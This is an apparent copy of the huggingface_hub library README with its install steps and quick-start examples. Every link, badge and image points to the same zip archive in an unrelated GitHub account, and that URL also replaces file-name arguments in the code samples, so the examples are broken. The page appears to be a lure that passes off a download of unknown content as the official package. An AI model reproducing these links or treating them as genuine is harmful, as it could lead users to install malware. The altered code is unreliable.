<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">
    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">
    <img alt="huggingface_hub library logo" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip" width="352" height="59" style="max-width: 100%;">
  </picture>
  <br/>
  <br/>
</p> 

<p align="center">
    <i>The official Python client for the Huggingface Hub.</i>
</p>

<p align="center">
    <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"><img alt="Documentation" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"></a>
    <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"><img alt="GitHub release" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"></a>
    <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"><img alt="PyPi version" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"></a>
    <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"><img alt="PyPI - Downloads" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"></a>
    <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"><img alt="Code coverage" src="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip"></a>
</p>

<h4 align="center">
    <p>
        <b>English</b> |
        <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">Deutsch</a> |
        <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">हिंदी</a> |
        <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">한국어</a> |
        <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip">中文（简体）</a>
    <p>
</h4>

---

**Documentation**: <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip" target="_blank">https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip</a>

**Source Code**: <a href="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip" target="_blank">https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip</a>

---

## Welcome to the huggingface_hub library

The `huggingface_hub` library allows you to interact with the [Hugging Face Hub](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip), a platform democratizing open-source Machine Learning for creators and collaborators. Discover pre-trained models and datasets for your projects or play with the thousands of machine learning apps hosted on the Hub. You can also create and share your own models, datasets and demos with the community. The `huggingface_hub` library provides a simple way to do all these things with Python.

## Key features

- [Download files](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) from the Hub.
- [Upload files](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) to the Hub.
- [Manage your repositories](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).
- [Run Inference](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) on deployed models.
- [Search](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) for models, datasets and Spaces.
- [Share Model Cards](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) to document your models.
- [Engage with the community](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) through PRs and comments.

## Installation

Install the `huggingface_hub` package with [pip](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip):

```bash
pip install huggingface_hub
```

If you prefer, you can also install it with [conda](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).

In order to keep the package minimal by default, `huggingface_hub` comes with optional dependencies useful for some use cases. For example, if you want have a complete experience for Inference, run:

```bash
pip install huggingface_hub[inference]
```

To learn more installation and optional dependencies, check out the [installation guide](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).

## Quick start

### Download files

Download a single file

```py
from huggingface_hub import hf_hub_download

hf_hub_download(repo_id="tiiuae/falcon-7b-instruct", filename="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip")
```

Or an entire repository

```py
from huggingface_hub import snapshot_download

snapshot_download("stabilityai/stable-diffusion-2-1")
```

Files will be downloaded in a local cache folder. More details in [this guide](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).

### Login

The Hugging Face Hub uses tokens to authenticate applications (see [docs](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip)). To log in your machine, run the following CLI:

```bash
huggingface-cli login
# or using an environment variable
huggingface-cli login --token $HUGGINGFACE_TOKEN
```

### Create a repository

```py
from huggingface_hub import create_repo

create_repo(repo_id="super-cool-model")
```

### Upload files

Upload a single file

```py
from huggingface_hub import upload_file

upload_file(
    path_or_fileobj="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip",
    path_in_repo="https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip",
    repo_id="lysandre/test-model",
)
```

Or an entire folder

```py
from huggingface_hub import upload_folder

upload_folder(
    folder_path="/path/to/local/space",
    repo_id="username/my-cool-space",
    repo_type="space",
)
```

For details in the [upload guide](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).

## Integrating to the Hub.

We're partnering with cool open source ML libraries to provide free model hosting and versioning. You can find the existing integrations [here](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip).

The advantages are:

- Free model or dataset hosting for libraries and their users.
- Built-in file versioning, even with very large files, thanks to a git-based approach.
- Serverless inference API for all models publicly available.
- In-browser widgets to play with the uploaded models.
- Anyone can upload a new model for your library, they just need to add the corresponding tag for the model to be discoverable.
- Fast downloads! We use Cloudfront (a CDN) to geo-replicate downloads so they're blazing fast from anywhere on the globe.
- Usage stats and more features to come.

If you would like to integrate your library, feel free to open an issue to begin the discussion. We wrote a [step-by-step guide](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) with ❤️ showing how to do this integration.

## Contributions (feature requests, bugs, etc.) are super welcome 💙💚💛💜🧡❤️

Everyone is welcome to contribute, and we value everybody's contribution. Code is not the only way to help the community.
Answering questions, helping others, reaching out and improving the documentations are immensely valuable to the community.
We wrote a [contribution guide](https://raw.githubusercontent.com/haymanwuzup/huggingface_hub/main/pachypodous/huggingface_hub.zip) to summarize
how to get started to contribute to this repository.
